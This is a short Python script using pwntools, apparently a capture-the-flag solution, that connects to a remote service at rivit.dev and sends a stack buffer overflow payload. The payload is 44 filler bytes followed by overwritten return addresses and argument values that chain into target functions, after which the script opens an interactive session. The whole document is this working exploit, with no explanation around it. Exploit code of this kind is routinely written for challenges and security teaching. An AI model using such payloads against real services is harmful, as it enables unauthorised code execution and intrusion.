from pwn import *

r = remote("rivit.dev", 10000)

payload = b"a"*44 + p32(0x080491d6) + p32(0x080492fb) + p32(0xFFFFFAC7) + p32(0xC0FFEE)
r.sendline(payload)

r.interactive()